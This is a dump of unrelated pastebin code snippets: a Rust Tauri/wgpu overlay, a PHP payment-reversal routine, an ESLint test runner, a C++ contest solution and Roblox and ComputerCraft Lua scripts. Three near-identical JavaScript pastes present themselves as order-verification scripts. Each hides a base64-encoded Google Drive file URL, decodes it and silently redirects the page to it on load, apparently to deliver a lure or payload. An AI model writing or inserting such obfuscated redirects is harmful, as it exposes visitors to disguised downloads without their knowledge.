            //     let mut rpass = encoder.begin_render_pass(&wgpu::RenderPassDescriptor {
            //         label: None,
            //         color_attachments: &[Some(wgpu::RenderPassColorAttachment {
            //             view: &view,
            //             resolve_target: None,
            //             ops: wgpu::Operations {
            //                 load: wgpu::LoadOp::Clear(wgpu::Color::GREEN),
            //                 store: wgpu::StoreOp::Store,
            //             },
            //         })],
            //         depth_stencil_attachment: None,
            //         timestamp_writes: None,
            //         occlusion_query_set: None,
            //     });
            //     rpass.set_pipeline(&wgpu_state.render_pipeline);
            //     rpass.draw(0..3, 0..1);
            // }

            // wgpu_state.queue.submit(Some(encoder.finish()));

            // Read the texture data before calling present
            let width = output.texture.size().width as usize;
            let height = output.texture.size().height as usize;
            let bytes_per_pixel = 4; // RGBA8 format
            let unaligned_bytes_per_row = width * bytes_per_pixel;
            let aligned_bytes_per_row = ((unaligned_bytes_per_row + 255) / 256) * 256;
            let buffer_size = aligned_bytes_per_row * output.texture.size().height as usize;

            println!(
                ""Texture size: width={}, height={}"",
                output.texture.size().width,
                output.texture.size().height
            );

            let buffer_desc = wgpu::BufferDescriptor {
                label: Some(""Staging Buffer""),
                size: buffer_size as wgpu::BufferAddress,
                usage: wgpu::BufferUsages::MAP_READ | wgpu::BufferUsages::COPY_DST,
                mapped_at_creation: false,
            };
            let staging_buffer = wgpu_state.device.create_buffer(&buffer_desc);

            let mut encoder = wgpu_state
                .device
                .create_command_encoder(&wgpu::CommandEncoderDescriptor { label: None });
            encoder.copy_texture_to_buffer(
                wgpu::ImageCopyTexture {
                    texture: &output.texture,
                    mip_level: 0,
                    origin: wgpu::Origin3d::ZERO,
                    aspect: wgpu::TextureAspect::All,
                },
                wgpu::ImageCopyBuffer {
                    buffer: &staging_buffer,
                    layout: wgpu::ImageDataLayout {
                        offset: 0,
                        bytes_per_row: Some(aligned_bytes_per_row as u32),
                        rows_per_image: Some(output.texture.size().height),
                    },
                },
                wgpu::Extent3d {
                    width: output.texture.size().width,
                    height: output.texture.size().height,
                    depth_or_array_layers: 1,
                },
            );
            wgpu_state.queue.submit(Some(encoder.finish()));

            /** Export frame */
            // Map the buffer to read the data
            // println!(""buffer {:?}"", staging_buffer);

            // Map the staging buffer to read the data
            let buffer_slice = staging_buffer.slice(..);
            let (sender, receiver) = futures::channel::oneshot::channel();
            buffer_slice.map_async(wgpu::MapMode::Read, move |result| {
                sender.send(result).unwrap();
            });
            wgpu_state.device.poll(wgpu::Maintain::Wait);

            receiver.await;

            let unaligned_width = output.texture.size().width as usize;
            let height = output.texture.size().height as usize;

            let data = buffer_slice.get_mapped_range();
            let image_data = data.to_vec(); // Copy buffer data to a Vec<u8>.
            drop(data); // Release the buffer mapping.

            // println!(""image_data {:?}"", image_data);

            let mut reconstructed_data = Vec::with_capacity(unaligned_bytes_per_row * height);

            for row in 0..height {
                let start = row * aligned_bytes_per_row;
                let end = start + unaligned_bytes_per_row; // Only take the valid portion
                reconstructed_data.extend_from_slice(&image_data[start..end]);
            }

            assert_eq!(reconstructed_data.len(), unaligned_bytes_per_row * height);
            println!(""Reconstructed data size: {}"", reconstructed_data.len());

            // println!(
            //     ""image_data {:?}, expected {:?}"",
            //     image_data.len(),
            //     aligned_bytes_per_row * height
            // );
            // println!(
            //     ""reconstructed_data {:?}, expected {:?}"",
            //     reconstructed_data.len(),
            //     aligned_bytes_per_row * height
            // );
            // println!(""Expected 1920000"");

            // Send the data to the webview
            let window = app_handle.get_webview_window(""main"").unwrap();
            if let Err(e) = window.emit(""frame-data"", reconstructed_data) {
                eprintln!(""Failed to emit data: {:?}"", e);
            }

            /** End */
            // Now call present
            output.present();

            println!(""Frame rendered in: {}ms"", t.elapsed().as_millis());
        }
    });

    Ok(())
}

async fn setup_app<'a>(app: &'a mut tauri::App) -> Result<(), Box<dyn Error>> {
    // Setup HTTP + WebSocket server
    let (tx, rx) = tokio::sync::mpsc::channel::<String>(32);

    tokio::spawn(async move {
        websocket_server(tx, rx).await;
    });

    Ok(())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let init = match Client::init_app(480) {
        Ok(val) => {
            let (client, single) = val;
            let _cb = client.register_callback(|p: PersonaStateChange| {
                println!(""Got callback: {:?}"", p);
            });

            let utils = client.utils();
            println!(""Utils:"");
            println!(""AppId: {:?}"", utils.app_id());
            println!(""UI Language: {}"", utils.ui_language());

            let apps = client.apps();
            println!(""Apps"");
            println!(""IsInstalled(480): {}"", apps.is_app_installed(AppId(480)));
            println!(""InstallDir(480): {}"", apps.app_install_dir(AppId(480)));
            println!(""BuildId: {}"", apps.app_build_id());
            println!(""AppOwner: {:?}"", apps.app_owner());
            println!(""Langs: {:?}"", apps.available_game_languages());
            println!(""Lang: {}"", apps.current_game_language());
            println!(""Beta: {:?}"", apps.current_beta_name());

            let friends = client.friends();
            println!(""Friends"");
            let list = friends.get_friends(FriendFlags::IMMEDIATE);
            println!(""{:?}"", list);
            for f in &list {
                println!(""Friend: {:?} - {}({:?})"", f.id(), f.name(), f.state());
                friends.request_user_information(f.id(), true);
            }
        }
        Err(err) => {
            println!(""Error {}"", err);
        }
    };

    tauri::Builder::default()
        .plugin(tauri_plugin_fs::init())
        .setup(move |app| {
            println!(""setup"");
            let _ = setup_wgpu_overlay(app);
            setup_app(app);
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![showOverlay])
        .build(tauri::generate_context!())
        .expect(""error while running tauri application"")
        .run(|app_handle, event| match event {
            RunEvent::WindowEvent {
                label: _,
                event: WindowEvent::Resized(size),
                ..
            } => {
                //
            }
            RunEvent::MainEventsCleared => {}
            _ => (),
        });
}
"
uZe9Sk3D,Untitled,iLoveToWatch,JavaScript,Friday 4th of April 2025 08:55:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/606/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NMVzcGDV,Untitled,MChaos,PHP,Friday 4th of April 2025 08:33:35 AM CDT,"    public function ReversePayment($payment, $amount)
    {

        $uuid = $payment['transaction_id'];
        // Дата и время формирования запроса на проверку статуса
        $dateTime = date('Y-m-d\TH:i:s');

        // Секретный ключ для подписи
        $secretKey = $this->signature;

        // Формируем строку для подписи
        $signature_string = $uuid . $dateTime . $this->merchant_id;

        // Генерируем подпись
        $signature = $this->generate_signature($signature_string, $secretKey);

        // Формируем параметры GET-запроса
        $params = [
            'uuid' => $uuid,
            'datetime' => $dateTime,
            'merchantId' => $this->merchant_id
        ];

        // Формируем URL для запроса
//        $url = 'https://qr-test.bpay.md/api/Qr/GetQrStatus?' . http_build_query($params);
        $url = 'https://qr-merchant.bpay.md/api/Qr/GetQrStatus?' . http_build_query($params);

        // Заголовки для запроса
        $headers = [
            'X-TraceReference: ' . $this->generate_trace_reference(),
            'X-HMAC-Signature: ' . $signature
        ];

        // Отправляем GET-запрос
        $response = $this->send_get_request($url, $headers);


        if ($response['isPaid'] && $response['paymentDetails']['state'] == 100) {
            $receiptNr = $response['paymentDetails']['receipt'];
            $postData = [
                ""datetime"" => $dateTime,
                ""merchantId"" => $this->merchant_id,
                ""receiptNr"" => $receiptNr,
                ""amount"" => $amount,
                ""description"" => 'Reverse Payment'
            ];

            // Формирование строки для подписи
            $signatureString = $dateTime . $this->merchant_id . $receiptNr . $amount . $postData['description'];

            // Генерация подписи HMAC SHA256
            $hmacSignature = $this->generate_signature($signatureString, $secretKey);

            // Заголовки для запроса
            $headers = [
                'X-TraceReference: ' . $this->generate_trace_reference(),
                'X-HMAC-Signature: ' . $hmacSignature,
                'Content-Type: application/json'
            ];

            $url = 'https://qr-merchant.bpay.md/api/Qr/ReversePayment?' . http_build_query($postData);


            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS => array(),
                CURLOPT_HTTPHEADER => $headers,
            ));

            $responseInfo = curl_exec($curl);


            $trans_data_array = [
                'contact_id' => $payment['contact_id'],
                'create_datetime' => date(""Y-m-d H:i:s""),
                'type' => 'reduce',
                'amount' => $amount,
                'method' => $payment['method'],
                'transaction_id' => $payment['transaction_id'],
                'comment' => 'MIA возврат средств',
                'status' => 'completed',
                'email_send' => $payment['email_send'],
                'trans_meterstop' => $payment['trans_meterstop'],
                'trans_duration' => $payment['trans_duration'],
                'trans_station' => $payment['trans_station'],
                'trans_connector' => $payment['trans_connector'],
                'trans_tarif' => $payment['trans_tarif'],
                'locale' => $payment['locale'],
                'currency' => $payment['currency'],
                'user_type' => $payment['user_type'],
                'info' => json_encode($responseInfo),
            ];

            if (!$this->websocket->insert('payments', $trans_data_array)) {

                $this->CI->db->insert('mia_logs', array('log'=>'error insert', 'pay_id'=>$payment['id']));
                return false;
            }

            return 1;


        }


        return $response;

    }"
qzLyq8sV,Order.js,iLoveToWatch,JavaScript,Friday 4th of April 2025 08:25:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/635/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JQwK5DJU,Untitled,djbob2000,TypeScript,Friday 4th of April 2025 08:22:41 AM CDT,"//custom-eslint-rules/run-eslint-tests.ts
import { readdirSync } from ""fs"";

console.log(""Running all ESLint rule tests...\n"");

// Find all test files in the current directory
const testFiles = readdirSync(""."")
    .filter((file) => file.endsWith("".test.ts""))
    .map((file) => ""./"" + file.replace("".ts"", "".js""));

// Import and run test files
await Promise.all(testFiles.map((file) => import(file)));

export {};


//custom-eslint-rules/test-utils/eslint-rule-tester.ts
import { RuleTester } from ""@typescript-eslint/rule-tester"";
import parser from ""@typescript-eslint/parser"";

// Console colors
const colors = {
    green: ""\x1b[32m"",
    red: ""\x1b[31m"",
    yellow: ""\x1b[33m"",
    blue: ""\x1b[34m"",
    reset: ""\x1b[0m"",
    bold: ""\x1b[1m"",
};

interface TestStats {
    passedTests: number;
    failedTests: number;
    totalTests: number;
}

export class ESLintRuleTestRunner {
    private stats: TestStats = {
        passedTests: 0,
        failedTests: 0,
        totalTests: 0,
    };

    private ruleTester: RuleTester;

    constructor() {
        // Setup test runner
        RuleTester.afterAll = () => {};
        RuleTester.describe = (_name, fn) => fn();
        RuleTester.it = (name, fn) => {
            this.stats.totalTests++;
            try {
                fn();
                console.log(`${colors.green}✓${colors.reset} ${name}`);
                this.stats.passedTests++;
            } catch (error: any) {
                console.log(`${colors.red}✗${colors.reset} ${name}`);
                console.log(`${colors.red}Error: ${error.message}${colors.reset}\n`);
                this.stats.failedTests++;
                throw error;
            }
        };

        // Create RuleTester instance
        this.ruleTester = new RuleTester({
            languageOptions: {
                parser,
                parserOptions: {
                    ecmaVersion: 2022,
                    sourceType: ""module"",
                },
            },
        });
    }

    runTests(
        ruleName: string,
        rule: any,
        testCases: {
            valid?: { code: string }[];
            invalid?: {
                code: string;
                errors: { messageId: string }[];
                output?: string;
            }[];
        }[],
    ) {
        console.log(`\n${colors.bold}Testing ESLint rule: ${colors.blue}${ruleName}${colors.reset}\n`);

        // Run valid cases
        if (testCases.some((cases) => cases.valid?.length)) {
            console.log(`${colors.bold}Testing Valid Cases (Should Pass):${colors.reset}`);
            this.ruleTester.run(`${ruleName}-valid`, rule, {
                valid: testCases.flatMap((cases) => cases.valid || []),
                invalid: [],
            });
        }

        // Run invalid cases
        if (testCases.some((cases) => cases.invalid?.length)) {
            console.log(`\n${colors.bold}Testing Invalid Cases (Should Fail):${colors.reset}`);
            this.ruleTester.run(`${ruleName}-invalid`, rule, {
                valid: [],
                invalid: testCases.flatMap((cases) => cases.invalid || []),
            });
        }

        // Print summary
        this.printSummary();
    }

    private printSummary() {
        console.log(`\n${colors.bold}Test Summary:${colors.reset}`);
        console.log(`${colors.green}✓${colors.reset} ${this.stats.passedTests} tests passed`);
        console.log(`${colors.red}✗${colors.reset} ${this.stats.failedTests} tests failed`);
        console.log(`${colors.blue}Total:${colors.reset} ${this.stats.totalTests} tests`);

        if (this.stats.failedTests > 0) {
            console.log(`\n${colors.bold}${colors.red}Some tests failed!${colors.reset}\n`);
            process.exit(1);
        } else {
            console.log(`\n${colors.bold}${colors.green}All tests passed successfully!${colors.reset}\n`);
        }
    }
}
"
TZMWeXBd,Market.js,iLoveToWatch,JavaScript,Friday 4th of April 2025 08:09:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/952/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XSvJpd6u,买瓜 参考代码,Dmaxiya,C++,Friday 4th of April 2025 08:08:23 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100;
int n, ans;
LL m;
LL num[maxn];
unordered_map<LL, int> cnt;
unordered_map<LL, int>::iterator it;

void dfs1(int depth, LL sum, int k) {
    if (sum > m) {
        return ;
    }
    if (depth == n / 2 + 1) {
        it = cnt.find(sum);
        if (it == cnt.end()) {
            cnt[sum] = k;
        } else {
            it->second = min(it->second, k);
        }
        return ;
    }
    dfs1(depth + 1, sum, k);
    dfs1(depth + 1, sum + num[depth], k);
    dfs1(depth + 1, sum + num[depth] / 2, k + 1);
}

void dfs2(int depth, LL sum, int k) {
    if (sum > m) {
        return ;
    }
    if (depth == n + 1) {
        it = cnt.find(m - sum);
        if (it != cnt.end()) {
            ans = min(ans, it->second + k);
        }
        return ;
    }
    dfs2(depth + 1, sum, k);
    dfs2(depth + 1, sum + num[depth], k);
    dfs2(depth + 1, sum + num[depth] / 2, k + 1);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n >> m;
    m <<= 1;
    for (int i = 1; i <= n; ++i) {
        cin >> num[i];
        num[i] <<= 1;
    }
    sort(num + 1, num + 1 + n);
    ans = INT_MAX;
    dfs1(1, 0, 0);
    dfs2(n / 2 + 1, 0, 0);
    cout << (ans == INT_MAX ? -1 : ans) << endl;

    return 0;
}"
GHWfEExE,Project Einstein: BHv5 Branch,1m1m0,Lua,Friday 4th of April 2025 08:06:01 AM CDT,"local MathParser = require(script.StringToMath) -- API to calculate operations from expressions
local IdRetriever = require(script.IdRetriever) -- API to generate a unique ID for each blackhole (60,466,176 IDs)
local blackHole = script.Parent -- Reference to the black hole

-- Generate a unique identifier for this black hole
local BHId = IdRetriever.GenerateID(5) -- Number represents the length of the ID. longer means more unique IDs

--------------------------------------------------------------------------------------------------------------------
-- This version is for purely technical & nerdy purposes. If you know how to code, you can screw around here, lol --
--------------------------------------------------------------------------------------------------------------------

-- Assume these are StringValue objects containing expressions
local GString = blackHole:FindFirstChild(""G_(gravity)"", true) -- e.g. ""6.67e-11""
local cString = blackHole:FindFirstChild(""c_(light_speed)"", true) -- e.g. ""3e8""
local customMassString = blackHole:FindFirstChild(""CustomMass"", true) -- optional string expression

local customMassEnabled = blackHole:FindFirstChild(""UseCustomMass"", true)
local useEinsteinian = blackHole:FindFirstChild(""UseEinsteinian"", true)

-- Ensure blackHole has an attachment for the line force target
local blackHoleAttachment = blackHole:FindFirstChild(""LineForceAttachment"")
if not blackHoleAttachment then
	blackHoleAttachment = Instance.new(""Attachment"")
	blackHoleAttachment.Name = ""LineForceAttachment""
	blackHoleAttachment.Parent = blackHole
end

-- Helper function: parse a StringValue's expression and update its value
-- If an error occurs during evaluation, rename the constant by appending ""[ERROR]""
-- If a valid value is returned, remove the ""[ERROR]"" substring if present
local function parseAndSetValue(strValue)
	local expr = strValue.Value
	-- Try a direct conversion first
	local numberVal = tonumber(expr)
	if numberVal then
		-- Update the string to the numeral equivalent
		strValue.Value = tostring(numberVal)
		-- Remove error indicator from the name if present
		strValue.Name = string.gsub(strValue.Name, ""%s*%[ERROR%]"", """")
		return numberVal
	else
		local success, result = pcall(function()
			return MathParser.evaluateExpression(expr)
		end)
		if success and type(result) == ""number"" then
			-- Replace the string with the computed number (as a string)
			strValue.Value = tostring(result)
			-- Remove error indicator from the name if present.
			strValue.Name = string.gsub(strValue.Name, ""%s*%[ERROR%]"", """")
			return result
		else
			-- Append ""[ERROR]"" to the current name if not already appended and set value to ""ERROR - Unrecognized""
			if not string.find(strValue.Name, ""%[ERROR%]"") then
				strValue.Name = strValue.Name .. "" [ERROR]""
				strValue.Value = ""ERROR - Unrecognized""
			end
			return 0
		end
	end
end

-- Helper function to update the black hole's name and its attachment name
local function updateBlackHoleName()
	local method = useEinsteinian.Value and ""Einstein"" or ""Newton""
	local massType = customMassEnabled.Value and ""Custom"" or ""Current""
	blackHole.Name = ""{BHv5} "" .. method .. "" | "" .. massType .. "" {"" .. BHId .. ""}""
	-- Update blackHoleAttachment's name based on the gravity mode
	if useEinsteinian.Value then
		blackHoleAttachment.Name = ""EinsteinianGravityAttachment""
	else
		blackHoleAttachment.Name = ""NewtonianGravityAttachment""
	end
end

-- Call it once initially
updateBlackHoleName()

-- When the gravity mode changes, update the name and remove forces that don't match this black hole
useEinsteinian.Changed:Connect(function(newValue)
	updateBlackHoleName()
	if newValue then
		-- Remove any Newtonian forces from objects that were created by this black hole
		for _, object in pairs(workspace:GetDescendants()) do
			if object:IsA(""BasePart"") then
				local force = object:FindFirstChild(""NewtonianGravity_"" .. BHId)
				if force then
					if force.Attachment0 then
						force.Attachment0:Destroy()
					end
					force:Destroy()
				end
			end
		end
	else
		-- Remove any Einsteinian forces from objects that were created by this black hole
		for _, object in pairs(workspace:GetDescendants()) do
			if object:IsA(""BasePart"") then
				local force = object:FindFirstChild(""RelativisticGravity_"" .. BHId)
				if force then
					if force.Attachment0 then
						force.Attachment0:Destroy()
					end
					force:Destroy()
				end
			end
		end
	end
end)

-- Also update the name if the CustomMassEnabled changes
customMassEnabled.Changed:Connect(function()
	updateBlackHoleName()
end)

-- Function to get the current mass for the black hole
local function getCurrentMass()
	if customMassEnabled.Value == true and customMassString then
		return parseAndSetValue(customMassString)
	else
		return blackHole:GetMass()
	end
end

-- Initially parse G and c
local G_val = parseAndSetValue(GString)
local c_val = parseAndSetValue(cString)

-- Initial calculation of event horizon (Schwarzschild radius) in meters
local eventHorizon = 2 * G_val * getCurrentMass() / (c_val^2)

-- Convert Roblox scale to real-world scale (1 meter = 4 studs)
local function studsToMeters(studs)
	return studs / 4
end

local function metersToStuds(meters)
	return meters * 4
end

-- VFX Monitoring
local function updateBlackHoleColor()
	local vfx = blackHole:FindFirstChild(""VFX"")
	if not vfx then
		blackHole.Color = Color3.fromRGB(0, 0, 0)
		return
	end

	-- If highlight is disabled, set color to black (also removes the glowing effect)
	local highlight = vfx:FindFirstChild(""Highlight"")
	if not highlight or (highlight:IsA(""Highlight"") and not highlight.Enabled) then
		blackHole.Color = Color3.fromRGB(0, 0, 0)
	else
		blackHole.Color = Color3.fromRGB(226, 155, 64)
	end
end

-- Function to update the black hole’s color based on negative gravity or mass
local function checkAndUpdateNegativeValues()
	local massVal = getCurrentMass()  -- get the current mass (custom if enabled)
	local vfx = blackHole:FindFirstChild(""VFX"")
	local highlight = vfx:FindFirstChild(""Highlight"")
	if G_val < 0 or massVal < 0 then
		-- If either value is negative, set blackHole color to white
		blackHole.Color = Color3.fromRGB(29, 100, 191)
		-- If there is a VFX with a Highlight, set its FillColor to white as well
		if vfx then
			local light = vfx:FindFirstChild(""PointLight"")
			if light and highlight:IsA(""PointLight"") then
				light.Color = Color3.fromRGB(29, 100, 191)
			end
			if highlight and highlight:IsA(""Highlight"") then
				highlight.FillColor = Color3.fromRGB(255, 255, 255)
			end
		end
	else
		-- Otherwise, update the color using the existing VFX logic
		updateBlackHoleColor()
		if highlight and highlight:IsA(""Highlight"") then
			highlight.FillColor = Color3.fromRGB(0, 0, 0)
		end
	end
end

-- Function to update the event horizon when any number value changes
local function updateEventHorizon()
	G_val = parseAndSetValue(GString)
	c_val = parseAndSetValue(cString)
	local M_val = getCurrentMass()
	eventHorizon = 2 * G_val * M_val / (c_val^2)

	-- After updating, check if either G or mass is negative.
	checkAndUpdateNegativeValues()
end

-- Attach event listeners to update when the string expressions change
GString.Changed:Connect(updateEventHorizon)
cString.Changed:Connect(updateEventHorizon)
if customMassString then
	customMassString.Changed:Connect(updateEventHorizon)
end

-- Also, if custom mass enabled changes, update both the name and the event horizon check:
customMassEnabled.Changed:Connect(function()
	updateBlackHoleName()
	updateEventHorizon()
end)

-- Threshold for minimal force magnitude
local MIN_FORCE_THRESHOLD = 0.001

-- Relativistic Gravity Function using the Schwarzschild approximation
local function relativisticGravity(object)
	if not object:IsA(""BasePart"") or object == blackHole or object.Anchored then
		return -- Skip non-BaseParts, anchored objects, and the black hole itself
	end

	local r = (blackHole.Position - object.Position).Magnitude
	local r_meters = studsToMeters(r)
	if r_meters <= (blackHole.Size.X / 16) then
		-- Object has crossed the event horizon; in this example, we simply return
		return
	end

	local g = (G_val * getCurrentMass()) / (r_meters^2) * (1 - (eventHorizon / r_meters))
	local g_studs = metersToStuds(g)
	local mass = object:GetMass()
	local computedMagnitude = g_studs * mass

	-- Unique force name for this black hole instance in Einstein mode
	local forceName = ""RelativisticGravity_"" .. BHId
	local existingForce = object:FindFirstChild(forceName)
	if math.abs(computedMagnitude) < MIN_FORCE_THRESHOLD then
		if existingForce then
			if existingForce.Attachment0 then
				existingForce.Attachment0:Destroy()
			end
			existingForce:Destroy()
		end
		return
	end

	-- Replace the Newtonian gravity with an Einsteinian gravity
	local force = existingForce
	if not force then
		force = Instance.new(""LineForce"")
		force.Name = forceName
		local objectAttachment = Instance.new(""Attachment"")
		objectAttachment.Name = ""EinsteinianGravityAttachment""
		objectAttachment.Parent = object
		force.Attachment0 = objectAttachment
		force.Attachment1 = blackHoleAttachment
		force.ApplyAtCenterOfMass = true
		force.Visible = true
		force.Parent = object
	end

	force.Magnitude = computedMagnitude
end

-- Newtonian Gravity Function using F = G * m1 * m2 / r^2
local function newtonianGravity(object)
	if not object:IsA(""BasePart"") or object == blackHole or object.Anchored then
		return -- Skip non-BaseParts, anchored objects, and the black hole
	end

	local r = (blackHole.Position - object.Position).Magnitude / 4
	local r_meters = studsToMeters(r)
	if r_meters <= 0 then return end

	local F = (G_val * getCurrentMass() * object:GetMass()) / (r_meters^2)
	local F_studs = metersToStuds(F)
	local forceName = ""NewtonianGravity_"" .. BHId
	local existingForce = object:FindFirstChild(forceName)
	if math.abs(F_studs) < MIN_FORCE_THRESHOLD then
		if existingForce then
			if existingForce.Attachment0 then
				existingForce.Attachment0:Destroy()
			end
			existingForce:Destroy()
		end
		return
	end

	-- Replace the Einsteinian gravity with a Newtonian gravity
	local force = existingForce
	if not force then
		force = Instance.new(""LineForce"")
		force.Name = forceName
		local objectAttachment = Instance.new(""Attachment"")
		objectAttachment.Name = ""NewtonianGravityAttachment""
		objectAttachment.Parent = object
		force.Attachment0 = objectAttachment
		force.Attachment1 = blackHoleAttachment
		force.ApplyAtCenterOfMass = true
		force.Visible = true
		force.Parent = object
	end

	force.Magnitude = F_studs
end

-- Apply gravitational effects on each heartbeat
game:GetService(""RunService"").Heartbeat:Connect(function()
	for _, object in pairs(workspace:GetDescendants()) do
		if useEinsteinian.Value then
			relativisticGravity(object) -- Einsteinian (Schwarzschild) approximation
		else
			newtonianGravity(object) -- Newtonian gravitational calculation
		end
	end
end)

-- Locate the VFX attachment removal
blackHole.ChildRemoved:Connect(function(child)
	if child.Name == ""VFX"" then
		updateBlackHoleColor()
	end
end)

-- Locate the highlight when VFX is added
blackHole.ChildAdded:Connect(function(child)
	if child.Name == ""VFX"" then
		local highlight = child:FindFirstChild(""Highlight"")
		if highlight and highlight:IsA(""Highlight"") then
			highlight.Changed:Connect(function(prop)
				if prop == ""Enabled"" then
					updateBlackHoleColor()
				end
			end)
		end
		updateBlackHoleColor()
	end
end)

local vfx = blackHole:FindFirstChild(""VFX"")
if vfx then
	local highlight = vfx:FindFirstChild(""Highlight"")
	if highlight and highlight:IsA(""Highlight"") then
		highlight.Changed:Connect(function(prop)
			if prop == ""Enabled"" then
				updateBlackHoleColor()
			end
		end)
	end
end

-- Initially check if the properties are changed prior to running
updateBlackHoleColor()"
WwG0Bgvf,playerDetector,Sammyyob,Lua,Friday 4th of April 2025 07:56:20 AM CDT,"-- Seite, an der der playerDetector angeschlossen ist
local detector = peripheral.wrap(""right"") -- passe das an deine Seite an
local redstoneSide = ""left"" -- Seite für das Redstone-Signal

-- Reichweite in Blöcken
local range_close = 5
local range_far = 15
while true do
	-- Spieler in Reichweite abrufen
	local players_far = detector.getPlayersInRange(range_far)
	
	while #players_far > 0 do
		-- Spieler in Reichweite abrufen
		local players_close = detector.getPlayersInRange(range_close)
		players_far = detector.getPlayersInRange(range_far)

		-- Prüfen, ob mindestens ein Spieler gefunden wurde
		if #players_close > 0 then
			redstone.setOutput(redstoneSide, true)
		else
			redstone.setOutput(redstoneSide, false)
		end

		-- kurze Pause (0.1 Sek.) bevor erneut geprüft wird
		sleep(0.1)
	end
	-- kurze Pause (1 Sek.) bevor erneut geprüft wird
	sleep(1)
end
"
